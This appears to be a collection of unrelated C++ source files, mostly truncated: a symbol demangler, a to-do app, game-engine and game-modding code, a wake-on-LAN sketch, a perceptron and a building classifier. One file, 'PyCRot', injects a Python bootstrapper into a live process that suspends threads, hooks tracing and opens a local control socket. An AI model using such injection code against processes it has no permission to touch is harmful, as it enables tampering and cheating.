'P':\n  case 'Q':\n  case 'R':\n  case 'S':\n    // These 4 values indicate some kind of pointer, but we still don't know\n    // what.\n    break;\n  default:\n    // isMemberPointer() is called only if isPointerType() returns true,\n    // and it rejects other prefixes.\n    DEMANGLE_UNREACHABLE;\n  }\n\n  // If it starts with a number, then 6 indicates a non-member function\n  // pointer, and 8 indicates a member function pointer.\n  if (startsWithDigit(MangledName)) {\n    if (MangledName[0] != '6' && MangledName[0] != '8') {\n      Error = true;\n      return false;\n    }\n    return (MangledName[0] == '8');\n  }\n\n  // Remove ext qualifiers since those can appear on either type and are\n  // therefore not indicative.\n  consumeFront(MangledName, 'E'); // 64-bit\n  consumeFront(MangledName, 'I'); // restrict\n  consumeFront(MangledName, 'F'); // unaligned\n\n  if (MangledName.empty()) {\n    Error = true;\n    return false;\n  }\n\n  // The next value should be either ABCD (non-member) or QRST (member).\n  switch (MangledName.front()) {\n  case 'A':\n  case 'B':\n  case 'C':\n  case 'D':\n    return false;\n  case 'Q':\n  case 'R':\n  case 'S':\n  case 'T':\n    return true;\n  default:\n    Error = true;\n    return false;\n  }\n}\n\nstatic SpecialIntrinsicKind\nconsumeSpecialIntrinsicKind(std::string_view &MangledName) {\n  if (consumeFront(MangledName, \"?_7\"))\n    return SpecialIntrinsicKind::Vftable;\n  if (consumeFront(MangledName, \"?_8\"))\n    return SpecialIntrinsicKind::Vbtable;\n  if (consumeFront(MangledName, \"?_9\"))\n    return SpecialIntrinsicKind::VcallThunk;\n  if (consumeFront(MangledName, \"?_A\"))\n    return SpecialIntrinsicKind::Typeof;\n  if (consumeFront(MangledName, \"?_B\"))\n    return SpecialIntrinsicKind::LocalStaticGuard;\n  if (consumeFront(MangledName, \"?_C\"))\n    return SpecialIntrinsicKind::StringLiteralSymbol;\n  if (consumeFront(MangledName, \"?_P\"))\n    return SpecialIntrinsicKind::UdtReturning;\n  if (consumeFront(MangledName, \"?_R0\"))\n    return SpecialIntrinsicKind::RttiTypeDescriptor;\n  if (consumeFront(MangledName, \"?_R1\"))\n    return SpecialIntrinsicKind::RttiBaseClassDescriptor;\n  if (consumeFront(MangledName, \"?_R2\"))\n    return SpecialIntrinsicKind::RttiBaseClassArray;\n  if (consumeFront(MangledName, \"?_R3\"))\n    return SpecialIntrinsicKind::RttiClassHierarchyDescriptor;\n  if (consumeFront(MangledName, \"?_R4\"))\n    return SpecialIntrinsicKind::RttiCompleteObjLocator;\n  if (consumeFront(MangledName, \"?_S\"))\n    return SpecialIntrinsicKind::LocalVftable;\n  if (consumeFront(MangledName, \"?__E\"))\n    return SpecialIntrinsicKind::DynamicInitializer;\n  if (consumeFront(MangledName, \"?__F\"))\n    return SpecialIntrinsicKind::DynamicAtexitDestructor;\n  if (consumeFront(MangledName, \"?__J\"))\n    return SpecialIntrinsicKind::LocalStaticThreadGuard;\n  return SpecialIntrinsicKind::None;\n}\n\nstatic bool startsWithLocalScopePattern(std::string_view S) {\n  if (!consumeFront(S, '?'))\n    return false;\n\n  size_t End = S.find('?');\n  if (End == std::string_view::npos)\n    return false;\n  std::string_view Candidate = S.substr(0, End);\n  ",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include <cstdlib>\n#include <stdexcept>\n#include <chrono>\n#include <thread>\nusing namespace std;\n\n// Change this file name if needed\nconst string userHome = getenv(\"HOME\"); \nconst string mainFile = userHome + \"/.config/todominal/todos.txt\";\n\n// Define colors for priorities\nstring RED = \"\\033[1;31m\";\nstring YELLOW = \"\\033[1;33m\";\nstring GREEN = \"\\033[1;32m\";\nstring RESET = \"\\033[0m\";\n\n// Function to remove a line from a specific line from a file\nvoid removeLine(const string& filename, int lineNumberToRemove) {\n    ifstream inputFile(filename);\n    vector<string> lines;\n\n    if (inputFile.is_open()) {\n        string line;\n        int currentLine = 1;\n        while (getline(inputFile, line)) {\n            if (currentLine != lineNumberToRemove) {\n                lines.push_back(line); // Keep the line if it's not the one to remove\n            }\n            currentLine++;\n        }\n        inputFile.close();\n\n        // Write the modified content back to the file\n        ofstream outputFile(filename);\n        if (outputFile.is_open()) {\n            for (const string& line : lines) {\n                outputFile << line << endl;\n            }\n            outputFile.close();\n        } else {\n            cerr << \"Unable to open output file: \" << filename << endl;\n        }\n    } else {\n        cerr << \"Unable to open input file: \" << filename << endl;\n    }\n}\n\n// Functiom to get a specific line of a file\nstring getLineContent(const string& filename, int lineNumber) {\n    ifstream file(filename);\n    string lineContent;\n    int currentLine = 1;\n\n    if (file.is_open()) {\n        string line;\n        while (getline(file, line)) {\n            if (currentLine == lineNumber) {\n                lineContent = line;\n                break;\n            }\n            currentLine++;\n        }\n        file.close();\n    } else {\n        cerr << \"Unable to open file: \" << filename << endl;\n    }\n\n    return lineContent;\n}\n\n// Function to Replace a line with a given line\nvoid replaceLine(const string& filename, int lineNumber, const string& newLine) {\n    ifstream inputFile(filename);\n    vector<string> lines;\n\n    if (inputFile.is_open()) {\n        string line;\n        int currentLine = 1;\n        while (getline(inputFile, line)) {\n            if (currentLine == lineNumber) {\n                lines.push_back(newLine); // Replace the line with newLine\n            } else {\n                lines.push_back(line); // Keep the original line\n            }\n            currentLine++;\n        }\n        inputFile.close();\n\n        // Write the modified content back to the file\n        ofstream outputFile(filename);\n        if (outputFile.is_open()) {\n            for (const string& line : lines) {\n                outputFile << line << endl;\n            }\n            outputFile.close();\n        } else {\n            cerr << \"Unable to open output file\\n\";\n        }\n    } else {\n        cerr << \"Unable to open input file\\n\";\n    }\n}\n\n// Function to StrikeThrough given text\nstring strikethrough(const string& text) \n{\n    string result;\n    result = \"\\e[9m\" + text + \"\\e[m\"; \n    return result;\n}\n\n// Function to remove a todo, check for int\nvoid removeTodo() {\n    string toRemove;\n    cout << \"Enter Todo Index to Remove: \";\n    std::cin >> toRemove;\n\n    bool isValid = true;\n    for (char c : toRemove) {\n        if (!isdigit(c)) {\n            isValid = false;\n            break;\n        }\n    }\n\n    if (isValid) {\n        int toRemoveint = stoi(toRemove);\n        removeLine(mainFile, toRemoveint);\n    } else {\n        cerr << \"Invalid input. Please enter a valid integer index.\" << endl;\n    }\n}\n\n\n// Function to mark a todo as done\nvoid markDone() {\n    string markInput;\n    cout << \"Enter Todo Index to Mark as Done: \";\n    std::cin >> markInput;\n    int markNum = stoi(markInput);\n    replaceLine(mainFile, markNum, strikethrough(getLineContent(mainFile, markNum)));\n}\n\n// Function to print indexed contents of a file\nvoid printTodo() {\n    int i = 1;\n    ifstream todos(mainFile);\n    if (todos.is_open()) {\n        string line;\n        while (getline(todos, line)) {\n            string color;\n            if (line.find(\"(h)\") != string::npos) {\n                color = RED;\n            } else if (line.find(\"(m)\") != string::npos) {\n                color = YELLOW;\n            } else if (line.find(\"(l)\") != string::npos) {\n                color = GREEN;\n            } else {\n                color = RESET;\n            }\n            cout << i << \". \" << color << line << RESET << endl;\n            i++;\n        }\n        todos.close();\n    } else {\n        cerr << \"Unable to open file\\n\";\n        exit(1);\n    }\n}\n\nvoid printTodoRofi() {\n    RED = \"<span foreground=\\\"#f38ba8\\\">\";\n    YELLOW = \"<span foreground=\\\"#f9e2af\\\">\";\n    GREEN = \"<span foreground=\\\"#a6e3a1\\\">\";\n    RESET = \"</span>\";\n    int i = 1;\n    ifstream todos(mainFile);\n    if (todos.is_open()) {\n        string line;\n        wh",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"CustomActorColorationSettings.h\"\n\nvoid UCustomActorColorationSettings::FillCollisionPresetColorMap()\n{\n\tTArray<TSharedPtr<FName>> ProfileNames;\n\tUCollisionProfile::Get()->GetProfileNames(ProfileNames);\n\n\t// remove\n\tTArray<FName> RemoveItems;\n\tfor (auto& CollisionPresetColorItem : CollisionPresetColorMap)\n\t{\n\t\tconst bool bIsFound = ProfileNames.ContainsByPredicate([&](const TSharedPtr<FName>& ProfileName)\n\t\t{\n\t\t\treturn *ProfileName == CollisionPresetColorItem.Key;\n\t\t});\n\t\tif(!bIsFound)\n\t\t{\n\t\t\tRemoveItems.Add(CollisionPresetColorItem.Key);\n\t\t}\n\t}\n\tfor (auto& RemoveItem : RemoveItems)\n\t{\n\t\tCollisionPresetColorMap.Remove(RemoveItem);\n\t}\n\t\n\t// add\n\tfor (TSharedPtr<FName> ProfileName : ProfileNames)\n\t{\n\t\tif(!CollisionPresetColorMap.Contains(*ProfileName))\n\t\t{\n\t\t\tCollisionPresetColorMap.Add(*ProfileName, FLinearColor::White);\n\t\t}\n\t}\n}\n\nUCustomActorColorationSettings::UCustomActorColorationSettings(const FObjectInitializer& ObjectInitializer)\n\t: Super(ObjectInitializer)\n{\n\tFillCollisionPresetColorMap();\n}\n\n#if WITH_EDITOR\nvoid UCustomActorColorationSettings::PostEditChangeProperty(FPropertyChangedEvent& PropertyChangedEvent)\n{\n\tSuper::PostEditChangeProperty(PropertyChangedEvent);\n\n\tFillCollisionPresetColorMap();\n}\n#endif",
    "#include \"rule_algo.hpp\"\n\n#include \"common.hpp\"\n\n// TODO: incorporate moldT into the subset system (let the working set be the intersection of subsetT and moldT)?\n// How to support an editable moldT that can be incompatible with the current rule?\n\nnamespace aniso {\n    namespace _subsets {\n        static const subsetT ignore_q = make_subset({mp_ignore_q});\n        static const subsetT ignore_w = make_subset({mp_ignore_w});\n        static const subsetT ignore_e = make_subset({mp_ignore_e});\n        static const subsetT ignore_a = make_subset({mp_ignore_a});\n        static const subsetT ignore_s_z = make_subset({mp_ignore_s}, mask_zero);\n        static const subsetT ignore_s_i = make_subset({mp_ignore_s}, mask_identity);\n        static const subsetT ignore_d = make_subset({mp_ignore_d});\n        static const subsetT ignore_z = make_subset({mp_ignore_z});\n        static const subsetT ignore_x = make_subset({mp_ignore_x});\n        static const subsetT ignore_c = make_subset({mp_ignore_c});\n\n        static const subsetT ignore_hex = make_subset({mp_hex_ignore});\n        static const subsetT ignore_von = make_subset({mp_von_ignore});\n\n        static const subsetT self_complementary = make_subset({mp_reverse}, mask_identity);\n\n        static const subsetT native_isotropic = make_subset({mp_refl_wsx, mp_refl_qsc});\n        static const subsetT native_refl_wsx = make_subset({mp_refl_wsx});\n        static const subsetT native_refl_asd = make_subset({mp_refl_asd});\n        static const subsetT native_refl_qsc = make_subset({mp_refl_qsc});\n        static const subsetT native_refl_esz = make_subset({mp_refl_esz});\n        static const subsetT native_C2 = make_subset({mp_C2});\n        static const subsetT native_C4 = make_subset({mp_C4});\n\n        static const subsetT native_tot_exc_s = make_subset({mp_C8, mp_tot_exc_s});\n        static const subsetT native_tot_inc_s = make_subset({mp_C8, mp_tot_inc_s});\n\n        static const subsetT hex_isotropic = make_subset({mp_hex_refl_asd, mp_hex_refl_aq});\n        static const subsetT hex_refl_asd = make_subset({mp_hex_refl_asd});\n        static const subsetT hex_refl_qsc = make_subset({mp_hex_refl_qsc});\n        static const subsetT hex_refl_wsx = make_subset({mp_hex_refl_wsx});\n        static const subsetT hex_refl_aq = make_subset({mp_hex_refl_aq});\n        static const subsetT hex_refl_qw = make_subset({mp_hex_refl_qw});\n        static const subsetT hex_refl_wd = make_subset({mp_hex_refl_wd});\n        static const subsetT hex_C2 = make_subset({mp_hex_C2});\n        static const subsetT hex_C3 = make_subset({mp_hex_C3});\n        static const subsetT hex_C6 = make_subset({mp_hex_C6});\n\n        static const subsetT hex_tot_exc_s = make_subset({mp_hex_C6, mp_hex_tot_exc_s});\n        static const subsetT hex_tot_inc_s = make_subset({mp_hex_C6, mp_hex_tot_inc_s});\n\n        static const subsetT von_tot_exc_s = make_subset({mp_von_ignore, mp_C4, mp_von_tot_exc_s});\n        static const subsetT von_tot_inc_s = make_subset({mp_von_ignore, mp_C4, mp_von_tot_inc_s});\n    } // namespace _subsets\n\n#ifdef ENABLE_TESTS\n    namespace _tests {\n        static const testT test_subsets = [] {\n            using namespace _subsets;\n            assert(ignore_e.includes(ignore_hex));\n            assert(ignore_z.includes(ignore_hex));\n            assert(ignore_q.includes(ignore_von));\n            assert(ignore_e.includes(ignore_von));\n            assert(ignore_z.includes(ignore_von));\n            assert(ignore_c.includes(ignore_von));\n\n            assert(native_C2.includes(native_C4));\n            for (const subsetT* set :\n                 {&native_refl_wsx, &native_refl_asd, &native_refl_qsc, &native_refl_esz, &native_C2, &native_C4}) {\n                assert(set->includes(native_isotropic));\n            }\n            assert(native_isotropic.includes(native_tot_exc_s));\n            assert(native_tot_exc_s.includes(native_tot_inc_s));\n\n            assert(hex_C2.includes(hex_C6));\n            assert(hex_C3.includes(hex_C6));\n            for (const subsetT* set : {&hex_refl_asd, &hex_refl_qsc, &hex_refl_wsx, &hex_refl_aq, &hex_refl_qw,\n                                       &hex_refl_wd, &hex_C2, &hex_C3, &hex_C6}) {\n                assert(ignore_hex.includes(*set));\n                assert(set->includes(hex_isotropic));\n            }\n            assert(hex_isotropic.includes(hex_tot_exc_s));\n            assert(hex_tot_exc_s.includes(hex_tot_inc_s));\n\n            assert(native_isotropic.get_par().k() == 102);\n            assert(hex_isotropic.get_par().k() == 26);\n            assert((native_isotropic & ignore_von).get_par().k() == 12); // von_isotropic\n\n            assert(native_tot_exc_s.get_par().k() == 9 * 2); // 0...8\n            assert(native_tot_inc_s.get_par().k() == 10);    // 0...9\n            assert(hex_tot_exc_s.get_par().k() == 7 * 2);    // 0...6\n            assert(hex_tot_inc_s.get_par().k() == 8);        // 0...7\n            assert(von_tot_exc_s.get_par().k() == 5 * 2);    // 0...4\n          ",
    "#include \"bemfa_client.hpp\"\n#include \"WakeOnLan.h\"\n#include \"wifi_helper.hpp\"\n\nBemfaClient* bemfaClient;\nWifiHelper* wifiHelper;\n\nWiFiUDP UDP;\nWakeOnLan WOL(UDP);\n\nconst int LED_Pin = 2;\n\nconst char *SSID = \"xxxx\";  // wifi\u540d\u79f0\nconst char *PSW = \"xxxx\";  // wifi\u5bc6\u7801\n\nconst char *UID = \"xxxx\";  // \u5df4\u6cd5\u4e91\u7684UID\nconst char *TOPIC = \"xxxx\";  // \u5df4\u6cd5\u4e91\u4e2d\u521b\u5efa\u7684TOPIC(\u4e0d\u662f\u6635\u79f0)\n\nconst char *TARGET_MAC_ADDR = \"xx:xx:xx:xx:xx:xx\";  // \u8981\u542f\u52a8\u7684\u7535\u8111\u7684MAC\u5730\u5740\n\nvoid blinkTwice() {\n    digitalWrite(LED_Pin, HIGH);\n    delay(200);\n    digitalWrite(LED_Pin, LOW);\n    delay(200);\n    digitalWrite(LED_Pin, HIGH);\n    delay(200);\n    digitalWrite(LED_Pin, LOW);\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    Serial.println(\"Beginning...\");\n    wifiHelper = new WifiHelper(SSID, PSW, LED_Pin);\n    bemfaClient = new BemfaClient(UID, TOPIC);\n    bemfaClient->addCommand(\"on\", []{\n        Serial.println(\"Send magic packet\");\n        WOL.setRepeat(3, 100);\n        WOL.calculateBroadcastAddress(WiFi.localIP(), WiFi.subnetMask());\n        WOL.sendMagicPacket(TARGET_MAC_ADDR);\n        blinkTwice();\n    });\n}\n\nvoid loop() {\n    wifiHelper->tick();\n    bemfaClient->tick();\n}",
    "#include <fstream>\n#include <string>\n#include <vector>\n#include \"perceptron.h\"\nusing namespace std;\n\nPerceptron::Perceptron(const string& weightsFile, double lr) : learningRate(lr), bias(0.0) {\n    ifstream inWeights(weightsFile);\n    double weight;\n    while (inWeights >> weight) {\n        weights.push_back(weight);\n    }\n    inWeights.close();\n}\n\nvoid Perceptron::weightsToFile(const string& weightsFile) {\n    ofstream outWeights(weightsFile);\n    if (outWeights.is_open()) {\n        for (double weight : weights) { // weight = weights[i]\n            outWeights << weight << \" \";\n        }\n        outWeights.close();\n    } else {\n        cout << \"unable to open weights file\\n\";\n    }\n}\n\nvoid Perceptron::biasToFile(const string& biasFile) {\n    ofstream outBias(biasFile);\n    if (outBias.is_open()) {\n        outBias << bias;\n        outBias.close();\n    } else {\n        cout << \"unable to open bias file\\n\";\n    }\n}\n\nint Perceptron::feedForward(const vector<int>& inputs) {\n    double sum = bias;\n    for (int i = 0; i < weights.size(); i++) {\n        sum += inputs[i]*weights[i];\n    }\n    \n    if (sum >= 0) {\n        return 1;\n    } else {\n        return -1;\n    }\n}\n\nvoid Perceptron::train(const vector<int>& inputs, int label) {\n    int prediction = feedForward(inputs);\n    int error = label - prediction;\n\n    bias += learningRate * error;\n    for (int i = 0; i < weights.size(); i++) {\n        weights[i] += learningRate * error * inputs[i];\n    }\n\n    weightsToFile(\"weights.txt\");\n    biasToFile(\"bias.txt\");\n}",
    "#include \"plugin.h\"\n#include \"CRunningScript.h\"\n#include \"CTheScripts.h\"\n#include \"CMessages.h\"\n//#include \"ScmExtenderAPI.h\"\n\nclass ScmExtender {\npublic: \n    static inline std::unordered_map<int32_t, int8_t(*)(int32_t*)> mapOfNewOpcodes = {};\n\n    static __declspec(dllexport) void AddOneCommand(int32_t command, int8_t(*func)(int32_t*)) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end())\n            std::cout << \"[SCRIPT] Command id \" << command << \" overwritten\" << std::endl;\n\n        mapOfNewOpcodes[command] = func;\n    }\n\n    static inline CRunningScript* currentScript = nullptr;\n    static __declspec(dllexport) void CollectParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->CollectParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void StoreParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->StoreParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void UpdateCompareFlag(uint8_t flag) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->UpdateCompareFlag(flag);\n    }\n\n    static int8_t ProcessOneCommand(CRunningScript* script) {\n        ++CTheScripts::CommandsExecuted;\n\n        int32_t m_nPrevIp = script->m_nIp;\n        int32_t command = CTheScripts::ScriptSpace[script->m_nIp + 1] << 8 | CTheScripts::ScriptSpace[script->m_nIp];\n        script->m_nIp += sizeof(uint16_t);\n        script->m_bNotFlag = (command & 0x8000);\n        command &= 0x7FFF;\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end()) {\n            currentScript = script;\n            tScriptParam* params = CTheScripts::ScriptParams;\n            return f->second((int32_t*)params);\n        }\n\n        script->m_nIp = m_nPrevIp;\n        --CTheScripts::CommandsExecuted;\n\n        return script->ProcessOneCommand();\n    }\n\n    ScmExtender() {\n        plugin::Events::initRwEvent += []() {\n            CTheScripts::ScriptSpace = plugin::patch::Get<uint8_t*>(0x4387A0 + 3);\n        };\n\n        auto processScriptHook = [](CRunningScript* script, void*) {\n            if (script->m_bUseMissionCleanup)\n                script->DoDeathArrestCheck();\n\n            if (script->m_bIsMission && CTheScripts::FailCurrentMission == 1 && script->m_nSP == 1)\n                script->m_nIp = script->m_anStack[--script->m_nSP];\n\n            if (CTimer::m_snTimeInMilliseconds >= script->m_nWakeTime) {\n                while (!ProcessOneCommand(script)) {\n                }\n            }\n\n            if (!script->m_bAwake)\n                return;\n\n            if (!(CPad::GetPad(0)->NewState.ButtonCross && !CPad::GetPad(0)->OldState.ButtonCross))\n                return;\n\n            script->m_nWakeTime = 0;\n\n            for (int i = 0; i < 6; i++) {\n                if (CMessages::BIGMessages[i].m_Stack[0].m_pText != nullptr)\n                    CMessages::BIGMessages[i].m_Stack[0].m_nStartTime = 0;\n            }\n\n            if (CMessages::BriefMessages[0].m_pText != nullptr)\n                CMessages::BriefMessages[0].m_nStartTime = 0;\n        };\n        plugin::patch::RedirectCall(0x4393DF, LAMBDA(void, __fastcall, processScriptHook, CRunningScript*, void*));\n    }\n} scmExtender;\n",
    "#pragma once\n\n// Dumped with Dumper-7!\n\n\n#include \"../SDK.hpp\"\n\nnamespace SDK\n{\n//---------------------------------------------------------------------------------------------------------------------\n// FUNCTIONS\n//---------------------------------------------------------------------------------------------------------------------\n\n\n// BlueprintGeneratedClass BP_SpeedLines_Camera_Lens.BP_SpeedLines_Camera_Lens_C\n// (Actor)\n\nclass UClass* ABP_SpeedLines_Camera_Lens_C::StaticClass()\n{\n\tstatic class UClass* Clss = nullptr;\n\n\tif (!Clss)\n\t\tClss = UObject::FindClassFast(\"BP_SpeedLines_Camera_Lens_C\");\n\n\treturn Clss;\n}\n\n\n// BP_SpeedLines_Camera_Lens_C BP_SpeedLines_Camera_Lens.Default__BP_SpeedLines_Camera_Lens_C\n// (Public, ClassDefaultObject, ArchetypeObject, WasLoaded, LoadCompleted)\n\nclass ABP_SpeedLines_Camera_Lens_C* ABP_SpeedLines_Camera_Lens_C::GetDefaultObj()\n{\n\tstatic class ABP_SpeedLines_Camera_Lens_C* Default = nullptr;\n\n\tif (!Default)\n\t\tDefault = static_cast<ABP_SpeedLines_Camera_Lens_C*>(ABP_SpeedLines_Camera_Lens_C::StaticClass()->DefaultObject);\n\n\treturn Default;\n}\n\n}\n\n\n",
    "#include <WinSock2.h>\n#include <Windows.h>\n#include <tlhelp32.h>\n#include <algorithm>\n#include <iostream>\n#include <iomanip>\n#include <fstream>\n#include <tchar.h>\n#include <stdio.h>\n#include <psapi.h>\n#include <random>\n#include <string>\n#include <future>\n\n#pragma comment(lib, \"ws2_32.lib\")\n\nstd::string pyCRotBootstrapper = \"\\n\\tdef __init__(self,currentLocals):\\n\\t\\tdel currentLocals[self.__class__.__name__];self.locals=currentLocals;self.compile=__import__('codeop').CommandCompiler();self.importTable={'threading':__import__('threading'),'traceback':__import__('traceback'),'random':__import__('random'),'inspect':__import__('inspect'),'ctypes':__import__('ctypes'),'socket':__import__('socket'),'sys':__import__('sys'),'dis':__import__('dis'),'os':__import__('os')};self.currentThreadID=self.importTable['ctypes'].windll.kernel32.GetCurrentThreadId();self.interpreterBuffer=[];self.cApis={};self.breakpointTypes=['variable','value','constant','exception','line'];self.vtypeMapping={'var':'variable','val':'value','const':'constant','exc':'exception','ln':'line'};self.breakpoints=[];self.debuggerBuffer=[];self.debuggerEnabled=False;self.currentBreakpoint=None;self.localSelfName=''.join(self.importTable['random'].SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')for _ in range(16));self.locals[self.localSelfName]=self;self.cApis['OpenThread']=self.importTable['ctypes'].windll.kernel32.OpenThread;self.cApis['SuspendThread']=self.importTable['ctypes'].windll.kernel32.SuspendThread;self.cApis['ResumeThread']=self.importTable['ctypes'].windll.kernel32.ResumeThread;self.cApis['CreateToolhelp32Snapshot']=self.importTable['ctypes'].windll.kernel32.CreateToolhelp32Snapshot;self.cApis['Thread32First']=self.importTable['ctypes'].windll.kernel32.Thread32First;self.cApis['Thread32Next']=self.importTable['ctypes'].windll.kernel32.Thread32Next;self.cApis['CloseHandle']=self.importTable['ctypes'].windll.kernel32.CloseHandle;self.cApis['ThreadEntry32']=self.importTable['ctypes'].c_ulong*7;self.importTable['sys']._settraceallthreads(self.traceHook)\\n\\t\\tif self.shouldSuspendThreads:self.suspendAllThreads()\\n\\t\\tsock=self.importTable['socket'].socket(self.importTable['socket'].AF_INET,self.importTable['socket'].SOCK_STREAM);sock.connect(('127.0.0.1',self.serverPort));self.rfile=sock.makefile('r');self.wfile=sock.makefile('w');self.interact()\\n\\tdef help(self):self.log(\\\"Welcome to PyCRot's help utility! Here you can see all the functions in the hidden class and what they do!\\\");self.log('');self.log(self.localSelfName+'.log(argument)\\\\t\\\\t\\\\tThis function outputs whatever you pass into it in the PyCRot terminal');self.log(self.localSelfName+'.suspendAllThreads()\\\\t\\\\tSuspends all running threads (except for the pycrot one)');self.log(self.localSelfName+'.resumeAllThreads()\\\\t\\\\tResumes all running threads (except for the pycrot one)');self.log(self.localSelfName+'.addBreakpoint(type, value)\\\\tAdds a breakpoint to the table, also callable with addBP() or addbp()');self.log(self.localSelfName+'.deleteBreakpoint(type, value)\\\\tRemoved a breakpoint to the table, also callable with delBP() or delbp()');self.log(self.localSelfName+'.clearBreakpoints()\\\\t\\\\tClears the breakpoint table, also callable with clsBP() or clsbp()');self.log('');self.log('Breakpoint types:');self.log('\\\\tvariable/var\\\\t\\\\t\\\\t\\\\tBreakpoints when a variable with the specified name is found');self.log('\\\\tvalue/val\\\\t\\\\t\\\\t\\\\tBreakpoints when a variable with the specified value is found');self.log('\\\\tconstant/const\\\\t\\\\t\\\\t\\\\tBreakpoints when a constant with the specified value is found');self.log('\\\\texception/exc\\\\t\\\\t\\\\t\\\\tBreakpoints when a exception is triggered');self.log('\\\\tline/ln\\\\t\\\\t\\\\t\\\\t\\\\tBreakpoints when a number line gets executed')\\n\\tdef writeRaw(self,data):self.wfile.write(data);self.wfile.flush()\\n\\tdef suspendAllThreads(self):self.actionOnThreads('SuspendThread')\\n\\tdef resumeAllThreads(self):self.actionOnThreads('ResumeThread')\\n\\tdef traceHook(self,currentFrame,event,arg):\\n\\t\\tcurrentFBack=currentFrame\\n\\t\\twhile currentFBack.f_back!=None:\\n\\t\\t\\tcurrentFBack=currentFBack.f_back\\n\\t\\t\\tif currentFBack.f_locals.get('self')==self:return self.traceHook\\n\\t\\tcurrentFrame.f_trace_opcodes=True\\n\\t\\tfor vbreakpoint in self.breakpoints.copy():\\n\\t\\t\\tif vbreakpoint==True:self.triggerBreakpoint(currentFrame,vbreakpoint,'breakpoint on next execution')\\n\\t\\t\\telif vbreakpoint['type']=='variable':\\n\\t\\t\\t\\tif vbreakpoint['value']in currentFrame.f_locals.keys():self.triggerBreakpoint(currentFrame,vbreakpoint,str(vbreakpoint['value'])+' found in locals with value '+str(currentFrame.f_locals[vbreakpoint['value']]),arg)\\n\\t\\t\\telif vbreakpoint['type']=='value':\\n\\t\\t\\t\\tif vbreakpoint['value']in currentFrame.f_locals.values():self.triggerBreakpoint(currentFrame,vbreakpoint,str(vbreakpoint['value'])+' found in locals with key '+str(list(currentFrame.f_locals.keys())[list(currentFrame.f_locals.values()).index(vbreakpoint['value'])]),ar",
    "#include <iostream>\n#include <vector>\n#include <tuple>\n#include <cmath>\n#include <string>\n#include <functional>\n#include <algorithm>\n#include <unordered_map>\n#include <mutex>\n#include <atomic>\n#include <memory>\n#include <chrono>\n#include <numeric>\n#include <thread>\n#include <unordered_set>\n#include <random>\n\n#include <mlpack.hpp>\n\n#include \"ogrsf_frmts.h\"\n#include <ogr_geometry.h>\n#include \"classifications.hpp\"\n\n// namespace fs = std::filesystem;\n\n// classification\n\nvoid cl::Cl_bild::logistic_factory(std::unique_ptr<preparation::Buildings>& prepared_bds, std::unique_ptr<preparation::Buildings>& without_factories,\n        std::unique_ptr<cl::Cl_bild>& final_data){\n    v_doub cat_from_genplan;\n    v_doub cat_simpl;\n    v_doub amen_d = prepared_bds->amenities_density;\n    v_doub center_d = prepared_bds->distance_to_center;\n\n    for (std::string icateg:prepared_bds->symplified_categ){\n        if (icateg == \"detached_h\"){\n            cat_simpl.push_back(static_cast<double>(0));\n        } else if (icateg == \"multi_h\"){\n            cat_simpl.push_back(static_cast<double>(0));\n        } else if (icateg == \"commerical\"){\n            cat_simpl.push_back(static_cast<double>(0));\n        } else if (icateg == \"factory\"){\n            cat_simpl.push_back(static_cast<double>(1));\n        } else {\n            cat_simpl.push_back(static_cast<double>(2));\n        }\n    }\n\n    for (std::string gen_categ:prepared_bds->genplan_categ){\n        if (gen_categ == \"res_low\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"res_4_9\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"res_9plus\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"office\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"factory\"){\n            cat_from_genplan.push_back(static_cast<double>(1));\n        } else {\n            cat_from_genplan.push_back(static_cast<double>(2));\n        }\n    }\n\n    v_doub train_gen;\n    v_doub train_simpl;\n    v_doub train_amenity;\n    v_doub train_center;\n    std::vector<size_t> lbls;\n    v_longlong train_id;\n\n    v_doub test_gen;\n    v_doub test_simpl;\n    v_doub test_amenity;\n    v_doub test_center;\n    v_longlong test_id;\n\n    if ((cat_from_genplan.size() == cat_simpl.size()) && (amen_d.size() == center_d.size())){\n        for (unsigned long i = 0; i != cat_from_genplan.size(); i++){\n\n            if ((cat_simpl.at(i) == static_cast<double>(1)) && (cat_from_genplan.at(i) == static_cast<double>(1))){\n\n                train_gen.push_back(cat_from_genplan.at(i));\n                train_simpl.push_back(cat_simpl.at(i));\n                train_amenity.push_back(amen_d.at(i));\n                train_center.push_back(center_d.at(i));\n                train_id.push_back(prepared_bds->osm_id_vec.at(i));\n                // Create factory objects in cl class\n                \n                OGRPoint centroid_1;\n                prepared_bds->ogr_poly_vec.at(i).Centroid(&centroid_1);\n                point_vector.push_back(centroid_1);\n                category.push_back(\"factory\");\n                levels.push_back(prepared_bds->levels.at(i));\n                area.push_back(prepared_bds->square_vec.at(i));\n                relative_density.push_back(prepared_bds->relative_density.at(i));\n\n                lbls.push_back(static_cast<size_t>(1));\n\n            } else if ((cat_simpl.at(i) == static_cast<double>(0)) && (cat_from_genplan.at(i) == static_cast<double>(0)) \n                                                                    && (prepared_bds->genplan_categ.at(i) != \"res_low\")){\n\n                train_gen.push_back(cat_from_genplan.at(i));\n                train_simpl.push_back(cat_simpl.at(i));\n                train_amenity.push_back(amen_d.at(i));\n                train_center.push_back(center_d.at(i));\n                train_id.push_back(prepared_bds->osm_id_vec.at(i));\n                